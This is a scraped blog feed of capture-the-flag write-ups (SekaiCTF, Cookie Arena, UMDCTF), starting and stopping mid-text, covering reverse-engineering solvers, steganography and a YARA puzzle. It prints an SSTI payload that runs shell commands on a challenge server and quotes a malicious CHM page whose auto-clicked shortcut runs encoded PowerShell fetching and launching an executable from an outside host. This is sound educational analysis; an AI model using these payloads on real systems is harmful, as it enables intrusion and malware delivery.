7LL) ) { buffer[7] = 0; v6 = buffer; while ( (unsigned __int8)(*v6 - 48) \u0026lt;= 9u ) { if ( \u0026amp;buffer[7] == ++v6 ) { v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * *(_DWORD *)buffer, 15), 11); v8 = __ROR4__(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15); v9 = 1984242169 * ((v7 + 1204333666) ^ (1507359807 * v8) ^ 7 ^ (((v7 + 1204333666) ^ (unsigned int)(1507359807 * v8)) \u0026gt;\u0026gt; 16)); if ( (((-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026gt;\u0026gt; 16) ^ (-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9))) != 261736481 ) return 0LL; return device_ioctl_cold(); } } return 0LL; } After writing a lot of failed solutions using rev, I switched to bruteforce.\nIt can be seen that layer 1 contains 7 chars, the algorithm is a bit complicated (and still confused between signed and unsigned type), so I will bruteforce this quickly (actually, while thinking about how to write bruteforce, I can finish the third rev challenge 🐧)\nscript bruteforce:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def __ROL4__(val, bits, bit_size=32): return (val \u0026lt;\u0026lt; bits % bit_size) \u0026amp; (2 ** bit_size - 1) | ((val \u0026amp; (2 ** bit_size - 1)) \u0026gt;\u0026gt; (bit_size - (bits % bit_size))) def __ROR4__(val, bits, bit_size=32): return ((val \u0026amp; (2 ** bit_size - 1)) \u0026gt;\u0026gt; bits % bit_size) | (val \u0026lt;\u0026lt; (bit_size - (bits % bit_size)) \u0026amp; (2 ** bit_size - 1)) for i in range(10000000): f = str(i).rjust(7, \u0026#39;0\u0026#39;).encode() tmp = (f[3] \u0026lt;\u0026lt; 24) | (f[2] \u0026lt;\u0026lt; 16) | (f[1] \u0026lt;\u0026lt; 8) | f[0] v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * tmp, 15), 11) v8 = __ROR4__(422871738 * ((f[5] \u0026lt;\u0026lt; 8) ^ (f[6] \u0026lt;\u0026lt; 16) ^ f[4]), 15) v9 = 1984242169 * (((v7 + 0x47C8AC62) \u0026amp; 0xFFFFFFFF) ^ ((1507359807 * v8) \u0026amp; 0xFFFFFFFF) ^ 7 ^ ((((v7 + 0x47C8AC62) \u0026amp; 0xFFFFFFFF) ^ ((1507359807 * v8) \u0026amp; 0xFFFFFFFF)) \u0026gt;\u0026gt; 16)) v9 \u0026amp;= 0xFFFFFFFF if ((((2477530742 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026amp; 0xFFFFFFFF) \u0026gt;\u0026gt; 16) ^ ((2477530742 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026amp; 0xFFFFFFFF)) == 261736481: print(f) \u0026ndash;\u0026gt; 6001337\nThe solution other with z3 makes me bitter\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from z3 import * buffer = [BitVec(f\u0026#39;x{i}\u0026#39;, 8) for i in range(7)] _buffer = buffer[:] buffer = [ZeroExt(24, x) for x in buffer] v8 = 7 * RotateLeft(1507359807 * RotateRight(422871738 * Concat(*_buffer[:4][::-1]), 15), 11) v9 = RotateRight(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15) v10 = 1984242169 * ((v8 + 1204333666) ^ (1507359807 * v9) ^ 7 ^ LShR((v8 + 1204333666) ^ (1507359807 * v9), 16)) s = Solver() s.add([And(x \u0026gt;= 0x30, x \u0026lt;= 0x39) for x in _buffer]) shr13 = (LShR(v10, 13) ^ v10) s.add((LShR((-1817436554 * shr13), 16) ^ (-1817436554 * shr13)) == 261736481) print(bytes([s.model()[x].as_long() for x in _buffer])) Check layer 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 v10 = copy_from_user(buffer, a3, 12LL); if ( !v10 ) { do { buffer[v10] += buffer[v10 + 1] * ~(_BYTE)v10; ++v10; } while ( v10 != 12 ); if ( *(_QWORD *)buffer != 0x788C88B91D88AF0ELL || *(_DWORD *)\u0026amp;buffer[8] != 2113081836 || buffer[12] ) return 0LL; printk(\u0026amp;unk_2EB, a3); return 1LL; } Layer 2, although it has 12 char, is easier to solve. Here, we will have 1 more hint to make solving easier, that the last character will be \u0026ldquo;}\u0026rdquo; :\u0026gt;\nThere are also other conditions:\nbuffer[i] += buffer[i + 1] * ~(_BYTE)v10; (i from 0 to 12) buffer[12] = 0 so buffer[11] = \u0026lsquo;}\u0026rsquo; Based on this, I can build the code through z3:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 def solve_buffer(): s = Solver() buffer = [BitVec(i, 8) for i in range(13)] buffer_ = [BitVec(i, 8) for i in range(13)] for i in range(12): buffer_[i] = buffer[i] + buffer[i + 1] * ~BitVecVal(i, 8) for i in range(12): s.add(And(buffer[i] \u0026gt;= 0x20, buffer[i] \u0026lt;= 0x7e)) s.add(Concat(buffer_[7], buffer_[6], buffer_[5], buffer_[4], buffer_[3], buffer_[2], buffer_[1], buffer_[0]) == 0x788C88B91D88AF0E) s.add(Concat(buffer_[11], buffer_[10], buffer_[9], buffer_[8]) == 2113081836) if s.check() == sat: x = s.model() result = [] for i in range(13): result.append(int(str(x[buffer[i]]))) return result else: return None def main(): result = solve_buffer() print(\u0026#39;\u0026#39;.join(chr(val) for val in result)) if __name__ == \u0026#34;__main__\u0026#34;: main() \u0026ndash;\u0026gt; SEKAIPL@YER}\nflag: SEKAI{6001337SEKAIPL@YER}\nSekaiCTF 2023 - REV Reviews The reverse challenges of SekaiCTF are diverse, new + extremely difficult If I let myself play only one topic, I\u0026rsquo;ll probably cry, so I should play a few more to keep rank :\u0026lt; The most unfortunate thing about this tournament is probably not re3 but the lack of pwn1 (wasting too much time doing pwn2), that\u0026rsquo;s all, stopping at top xx/981 is good, next year I will take revenge: \u0026gt; ","date":"2023-08-27T00:00:00Z","image":"/p/sekaictf-2023-reverse-engineering/featured-image_hu53ff5d738f6f6b8e65c2845372b95fb7_671573_120x120_fill_box_smart1_3.png","permalink":"/p/sekaictf-2023-reverse-engineering/","title":"SekaiCTF 2023 | Reverse Engineering"},{"content":"Pyreverse Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong.\nSử dụng pydumpck để decompile exe \u0026ndash;\u0026gt; py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # pyreverser.pyc.cdc.py import base64 def reverse_string(s): return s[::-1] def scramble_flag(flag): scrambled = \u0026#39;\u0026#39; for i, char in enumerate(flag): if i % 2 == 0: scrambled += chr(ord(char) + 1) continue scrambled += chr(ord(char) - 1) return scrambled def main(): print(base64.b64decode(\u0026#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==\u0026#39;)) secret_flag = scramble_flag(reverse_string(base64.b64decode(\u0026#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==\u0026#39;)).decode()) print(\u0026#39;Welcome to PyReverser!\u0026#39;) print(\u0026#39;Please enter a word or phrase:\u0026#39;) user_input = input() generated_value = scramble_flag(reverse_string(user_input.upper())) print(\u0026#39;Generated value:\u0026#39;, generated_value) print(\u0026#39;Can you find the hidden flag?\u0026#39;) reversed_flag = reverse_string(secret_flag) print(\u0026#39;Reversed flag:\u0026#39;, reversed_flag) if __name__ == \u0026#39;__main__\u0026#39;: main() Để ý flag được decode từ đoạn base64 bên trên\n1 2 root@Spid3r:~# echo \u0026#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==\u0026#39; | base64 -d CHH{python2Exi_Reverse_ENginering} Jump Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong​\nPhân tích file Để ý rằng đây chỉ là 1 file exe có thể decompile 1 cách đơn giản (Ở đây thì mình chẳng thấy có chỗ nào gọi là sinh key bản quyền phần mềm cả)\nLợi dụng chạy hàm _flag bằng cách nhập ​địa chỉ _flag vào ô nhập khi chạy jump.exe\nTìm địa chỉ _flag và lấy flag Cách 1 (tìm trực tiếp địa chỉ _flag thông qua đoạn mã được dump) Cách 2 (Sử dụng edit function để kiểm tra địa chỉ hàm flag) Lưu ý: địa chỉ 00401500 đang ở hexa \u0026ndash;\u0026gt; đổi sang decimal là 4199680​\nRev1 Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.\nPhân tích file PE32 \u0026ndash;\u0026gt; 32 bits\nGUI \u0026ndash;\u0026gt; WinMain\nWinMain Xử lý I/O Kiểm tra trong DialogBoxParamA\nHàm GetItemTextA sẽ lấy các string được input vào và check key qua sub_402030\nKiểm tra hàm này thì thấy rằng dword_414448 chưa được khởi tạo vì vậy chúng ta sẽ debug để xem nó là gì (xem video dưới đây)\nDebug Your browser doesn't support HTML5 video. Here is a\rlink to the video instead.\rDựa vào những gì debug được có thể viết lại đoạn code dưới đây:\nĐến đây thì chỉ đơn giản là dùng z3 để viết script giải solve_rev1.py để lấy key\nCV Malware Thời gian gần đây có nhiều hình thức xâm nhập vào máy tính nạn nhân thông qua mã độc được gắn trong file Word. Khi mã độc thực thi, chúng sẽ lấy thông tin của nạn nhân để gửi về máy chủ điều khiển C\u0026amp;C. Liệu hacker cũng có thể thể bị hack, hãy cùng đi săn kẻ xấu nhé!\nMang tiếng Malware nhưng là bài duy nhất rev tải về không bị Windows tự động phát hiện và xoá :))\nPhân tích file Dựa vào kiểm tra header của file thì linux cho rằng đây là 1 file Word (nhưng thực chất Word được cấu tạo như 1 file Zip)\nUnzip \u0026amp; check Từ đây mình tiến hành giải nén \u0026ldquo;file zip\u0026rdquo; này ra và kiểm tra xem nó có gì lạ hay không (Chú ý đến các file xml xuất hiện trong bản giải nén này)\nQua việc nhìn bằng mắt thường thì cũng thấy rằng đoạn XML này thực ra được mã hóa từ hexa và base64, mình sẽ tiến hành decode nó\nDecode 1 2 3 server: host: http://REPLACE_HOST_HERE secret: SecR3TtOKen Nhìn qua thì đây là giống như 1 chỉ dẫn về host và mật khẩu của server để file này tương tác với nó thì phải\nDựa vào header MZ của đoạn base64 được decode kia thì có thể đoán được đây là 1 file exe trên Windows, export về và load vào IDA để kiểm tra xem nó có gì nào\nmain Nhìn kỹ 1 chút thì ở đây có hàm downloadFile với tham số là REPLACE_HOST_HERE, kiểm tra trực tiếp nó thì thấy được đoạn phương thức GET client.exe từ /static về\nVới host mặc định của challenge thì chắc chắn sẽ lấy file từ http://103.97.125.53:31040/static/client.exe​ truy cập vào đó và lấy file về, có thể đây là phương thức giao tiếp giữa người bị hại và server.\nclient.exe Đây là 1 file được viết bởi Golang, dạo gần đây mình thấy các challenge kiểu tương tác giữa client và server được dùng rất nhiều\nLoad file vào IDA\nDựa vào cách đặt tên thì có thể đoán được:\nmain_getSystemInfo() là hàm lấy các thông tin của máy nạn nhân main_sendPostRequest() là hàm gửi đi các thông tin lấy được (client.exe sẽ tương tác với host) Còn về hàm main_loadAllConfigs() thì mình chưa hình dung ra được nó sẽ làm gì, có thể là liên quan đến việc config nào đó cho phía server hiểu được và lúc này thì có thể để ý đến đoạn chỉ dẫn về host và secret ban nãy main_loadAllConfigs(): Khi để file config cùng trong thư mục với client.exe thì có thấy lỗi về ini \u0026ndash;\u0026gt; đổi thành config.ini và chuyển host: http://103.97.125.53:31040\nBắt tương tác giữa client với host thông qua Wireshark Từ đây có thể thấy client gửi các thông tin về username, hostname từ phía client đồng thời cùng với secret: SecR3TtOken lên server và được trả về Logged username hostname\nTừ đây có thể viết 1 đoạn script mô phỏng việc gửi thông tin và nhận thông tin giữa client và server như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import request url = \u0026#34;http://103.97.125.53:31040\u0026#34; header = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Go-http-server/1.1\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Secret\u0026#34;: \u0026#34;SecR3Ttoken\u0026#34; } payload = { \u0026#34;username\u0026#34;: \u0026#34;SPID3R-MSI\\Spid3r\u0026#34;, \u0026#34;hostname\u0026#34;: \u0026#34;Spider-msi\u0026#34; } response = requests.post(url, headers=headers, json=payload) print(response.text) # Logged SPID3R-MSI\\Spid3r Spid3r-msi Vậy thì đã giải quyết xong việc kết nối \u0026ldquo;nhân tạo\u0026rdquo; giữa client và server thông qua đoạn script trên\ndựa vào hint mà nếu không đưa ra thì không ai biết mà giải nổi đến từ tác giả FLAG nằm trên host, tìm cách kết nối đúng và exploit\nthì bây giờ việc quan trọng nhất sẽ là đi tìm lỗi trên server để dựa vào việc khai thác nó và lấy flag\nMay thật, thử phát đầu thì dính đét lỗi SSTI luôn, việc cuối cùng chỉ là viết payload để get flag trực tiếp từ server thôi\nScript giải:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import request url = \u0026#34;http://103.97.125.53:31040\u0026#34; header = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Go-http-server/1.1\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Secret\u0026#34;: \u0026#34;SecR3Ttoken\u0026#34; } payload = { \u0026#34;username\u0026#34;: \u0026#34;{{url_for.__globals__.os.__dict__.popen(\u0026#39;cat /flag.txt).read()}}\u0026#34;, \u0026#34;hostname\u0026#34;: \u0026#34;Spider-msi\u0026#34; } response = requests.post(url, headers=headers, json=payload) print(response.text) # Logged CHH{ExtR@Ct_m4CRo_aNd_h@Ck_C2c_d791e9a6f418993651267fbae56e3c46} Spid3r-msi ","date":"2023-07-09T00:00:00Z","image":"/p/cookie-arena-2-reverse-engineering/featured_hu1d606a7f3123979285701cf8aea1cd37_774107_120x120_fill_box_smart1_3.png","permalink":"/p/cookie-arena-2-reverse-engineering/","title":"Cookie Arena 2 | Reverse Engineering"},{"content":"Information UMDCTF 2023 starts at 5:00 AM on April 29, 2023, and ends at 5:00 AM on May 1, 2023 (which is not at all suitable for someone like me who loves to sleep in). The challenges in this competition revolve around Pokemon.\nRanking Our team ranked 17th/745 teams with 12,799 points. Detail of scoreboard here\nIt\u0026rsquo;s a bit disappointing that during the competition, I couldn\u0026rsquo;t fully solve the Forensics challenges. By around 5 AM, when the competition ended, I was too exhausted to continue thinking.\nIn this writeup, I will provide solutions for the challenges in ascending order based on their increasing point values.\nMalware Chall Disclaimer This challenge provided hint to the Doctor Hate Him challenge, and I\u0026rsquo;ll discuss that later. Here, they have given the flag.\nUMDCTF{i_understand_that_malware_chall_is_sus}\nMirror Unknown Here we have received a picture (.png file).\nUsing Google Images, we found a cipher alphabet chart.\nThen we put the words obtained into the format of the flag: UMDCTF{} and add the note: Ancient civilizations didn\u0026rsquo;t believe in whitespace or lowercase\nUMDCTF{SINJOHRUINS}\nNo. 352 Here, there is a mention of password 1 and password 2, which made me think of the steghide tool (pay attention to password 1, which is the name of Pokemon number 352 - written in lowercase).\npassword 1: kecleon\n1 2 3 4 ┌──(kali㉿Spid3r)-[~/Downloads] └─$ steghide extract -sf hide-n-seek.jpg Enter passphrase: wrote extracted data to \u0026#34;kecleon.jpg\u0026#34;. and password 2: timetofindwhatkecleonishiding (In the description of the challenge\u0026hellip;)\n1 2 3 4 ┌──(kali㉿Spid3r)-[~/Downloads] └─$ steghide extract -sf kecleon.jpg Enter passphrase: wrote extracted data to \u0026#34;flag.txt\u0026#34;. UMDCTF{KECLE0NNNNN}\nFire Type Pokemon Only In this challenge, we receive a pcapng file. Use Wireshark to read the data.\nI have checked both strings and filtered the captured data, but I haven\u0026rsquo;t found anything other than the files retrieved from FTP.\nBased on the header of the secret file, we can determine that it is a zip file (the remaining files also have the correct format).\nAnd this zip file requires us to enter a password\u0026hellip; to extract a file named wisdom.mp4.\nUpon searching for \u0026lsquo;pass\u0026rsquo; in that pcapng file, we found the actual password for this file..\nYARA Trainer Gym This is quite an interesting challenge that I had the opportunity to explore :))). The challenge provides us with a website to test: https://yara-trainer-gym.chall.lol\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import \u0026#34;elf\u0026#34; import \u0026#34;math\u0026#34; rule rule1 { condition: uint32(0) == 0x464c457f } rule rule2 { strings: $rocket1 = \u0026#34;jessie\u0026#34; $rocket2 = \u0026#34;james\u0026#34; $rocket3 = \u0026#34;meowth\u0026#34; condition: all of ($rocket*) } rule rule3 { meta: description = \u0026#34;Number of sections in a binary\u0026#34; condition: elf.number_of_sections == 40 } rule rule4 { strings: $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65} $hex2 = {5445414d524f434b4554} $hex3 = {696d20736f207469726564} $hex4 = {736c656570792074696d65} condition: ($hex1 and $hex2) or ($hex3 and $hex4) } rule rule5 { condition: math.entropy(0, filesize) \u0026gt;= 6 } rule rule6 { strings: $xor = \u0026#34;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#34; xor condition: $xor } rule rule7 { condition: for any section in elf.sections : (section.name == \u0026#34;poophaha\u0026#34;) } rule rule8 { condition: filesize \u0026lt; 2MB and filesize \u0026gt; 1MB } Basically, here we have to create a file and upload it to the website (satisfying all 8 rules) in order to obtain the flag.\nI approached it by dividing the file into two separate smaller files (each file satisfying a specific set of rules) to avoid complexity during creation.\nThe first file will satisfy rules 1-4 and 6-7. The second file will satisfy rules 5 and 8 (since generating entropy and file size simultaneously with creating the attributes mentioned above can be a bit challenging).\nFirst file first rule:\nuint32(0) == 0x464c457f\nThis checks whether the first 32 bits (offset 0) have the value 0x464c457f (indicating whether the file is in the ELF format or not)\nTo achieve this, it\u0026rsquo;s quite simple. Just add the value 7f 45 4c 46 corresponding to ELF to the file header.\nsecond rule:\n1 2 3 4 5 6 7 strings: $rocket1 = \u0026#34;jessie\u0026#34; $rocket2 = \u0026#34;james\u0026#34; $rocket3 = \u0026#34;meowth\u0026#34; condition: all of ($rocket*) Rule 2 requires the file to contain the strings: jessie, james, and meowth.\n\u0026ndash;\u0026gt; Convert them to hexadecimal and insert them into the file: 6a 65 73 73 69 65 6a 61 6d 65 73 6d 65 6f 77 74 68\nthird rule:\n1 2 3 4 meta: description = \u0026#34;Number of sections in a binary\u0026#34; condition: elf.number_of_sections == 40 This rule checks if the number of sections in the file is exactly 40. I decided to create a file from C to have multiple initial sections.\n1 2 3 4 5 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# echo \u0026#34;int main(){return 0;}\u0026#34; \u0026gt; main.c ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# gcc -o main main.c Check the number of sections in the newly created main file using the command:\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# objdump -h main Then add the sections to the main file using the command (each time adding one section, continuously repeating until the main file has 40 sections).\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# objcopy --add-section .mysection=data.txt main fourth rule\n1 2 3 4 5 6 7 8 strings: $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65} $hex2 = {5445414d524f434b4554} $hex3 = {696d20736f207469726564} $hex4 = {736c656570792074696d65} condition: ($hex1 and $hex2) or ($hex3 and $hex4) We can choose either hex1 and hex2 or hex3 and hex4 as pairs to insert into the file.\nsixth rule\n1 2 3 4 strings: $xor = \u0026#34;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#34; xor condition: $xor Add the string aqvkpjmdofazwf{lqjm1310\u0026lt; to complete the process: 61 71 76 6b 70 6a 6d 64 6f 66 61 7a 77 66 7b 6c 71 6a 6d 31 33 31 30 3c.\nseventh rule\n1 2 condition: for any section in elf.sections : (section.name == \u0026#34;poophaha\u0026#34;) We need a section named poophaha (Please note that with the 40 sections created earlier, one of them should be named poophaha)\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# objcopy --add-section .poophaha=data.txt main Second file For the remaining part, since rules 5 and 8 go together, I will create a new file and then merge the two files together.\n1 2 3 4 5 6 7 8 9 rule rule5 { condition: math.entropy(0, filesize) \u0026gt;= 6 } rule rule8 { condition: filesize \u0026lt; 2MB and filesize \u0026gt; 1MB } Rule 5 requires the entropy of the file to be greater than or equal to 6, while Rule 8 specifies that the file size must be greater than 1MB and less than 2MB.\nAfter creating the first file, its entropy is quite low (less than 1 dot), so I need to create a new file with a higher entropy to compensate.\nTo achieve an entropy of greater than or equal to 6 (which is quite challenging with files generated from my processes as they often contain repeated bytes), I will create a new file\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# openssl rand -out random.bin 2000000 2000000 here represents the size of the file after creation. I chose this number to comply with Rule 8, and the entropy of the file random.bin generated is very high :)\nNext, I will combine these two files together. To make it easier with a large number of bytes, I will use CyberChef.\nhex of file và file after creation\nUMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}\nAlso, in this challenge it is possible to increase entropy using a zip file. The algorithm it uses is suitable for pushing up the entropy level, which corresponds to a higher degree of randomness between bytes. Telekinetic Warfare In this challenge, we obtained a GIF file where each frame of the GIF represents a QR code. I wrote a script to separate the QR codes and decode them simultaneously.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import os import glob from PIL import Image from pyzbar.pyzbar import decode # Replace \u0026#39;path/to/folder\u0026#39; with the actual path to the folder containing the QR codes folder_path = \u0026#39;qrcodes/\u0026#39; output_file = \u0026#39;qr_codes.txt\u0026#39; # Create a list of all the image files in the folder image_files = glob.glob(os.path.join(folder_path, \u0026#39;*.jpg\u0026#39;)) # Open the output file for writing with open(output_file, \u0026#39;w\u0026#39;) as f: # Loop over each image file in the folder for image_file in image_files: # Open the image and decode the QR code image = Image.open(image_file) qr_code = decode(image) # If a QR code was detected, write the URL to the output file if qr_code: url = qr_code[0].data.decode() f.write(url + \u0026#39;\\n\u0026#39;) After running the script, we obtained a bunch of base64 strings, which were then converted into a PDF file. You can view the decoded flag in the decode flag.\nUMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}\nDoctors hate him!! Based on the Malware Chall Disclaimer challenge, we can infer that this challenge is related to malware (perhaps reverse malware?). little timmy and i spent the whole night reversing the file that we suspected to be malicious, and the ending was truly unforgettable.\nIn this challenge, I received a chm file. According to my research, it is a Compiled HTML Help file. I tried opening it with Microsoft Help, but didn\u0026rsquo;t find much\u0026hellip; (except for a button that didn\u0026rsquo;t do anything).\nBased on this button, I think it might have originally been a web page\u0026hellip;\nI used the HelpSmith tool and obtained the following zip file.\nYes, it does contain a real web page\u0026hellip; now it\u0026rsquo;s more accurate.\nIn the source code of the web page, there is a base64-encoded string: VU1EQ1RGezE5OTdfY2FsbGVkXw==.\n\u0026ndash;\u0026gt; UMDCTF{1997_called_\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA\u0026#39;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--VU1EQ1RGezE5OTdfY2FsbGVkXw==--\u0026gt; \u0026lt;OBJECT id=shortcut classid=\u0026#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\u0026#34; width=1 height=1\u0026gt; \u0026lt;PARAM name=\u0026#34;Command\u0026#34; value=\u0026#34;ShortCut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Button\u0026#34; value=\u0026#34;Bitmap::shortcut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA\u0026#39;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item2\u0026#34; value=\u0026#34;273,1,1\u0026#34;\u0026gt; \u0026lt;/OBJECT\u0026gt; \u0026lt;SCRIPT\u0026gt; shortcut.Click(); \u0026lt;/SCRIPT\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;strong\u0026gt; \u0026lt;h1\u0026gt;DOCTORS HATE HIM!!\u0026lt;/h1\u0026gt; \u0026lt;/strong\u0026gt; \u0026lt;p\u0026gt;Do you suffer from low energy, fatigue, and a general lack of motivation? Did your Pokemon leave you for a better trainer? Rocket Corp\u0026#39;s Master Ball Serum can help! Our all-natural formula boosts your energy levels and helps you feel like a young trainer ready to take on the world again!\u0026lt;/p\u0026gt;\u0026lt;button\u0026gt;Find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;image\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;depressed_pokemon_trainer.png\u0026#34; alt=\u0026#34;Pikachu\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $env:WEB_REQUEST -Uri http://dns-server:6969/explorer.exe -OutFile explorer.exe; Start-Process explorer.exe and\n1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7AA== Decoding the above base64 string yields Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe;\nAfterwards, I found another segment.\n1 SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA Decode base64: Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'\ngurl_jnag_gurve looks quite similar to a flag :)), I used ChatGPT and found out it\u0026rsquo;s ROT13 encoded :))), guessing until death!!!\n\u0026ndash;\u0026gt; they_want_their\nHere comes the one wrong step, one mile astray moment. From those code snippets and the mentioned command, I only interpreted the PowerShell command executing explore.exe in connection with the challenge name Malware Chall Disclaimer. As a result, I misunderstood that I had to dive into researching that malware to trace it down :)), wasting two hours trying to trace and reverse-engineer that explore.exe while also attempting to decipher it before reaching the solution.\nI should have checked the website itself to see if there was anything significant.\nThank 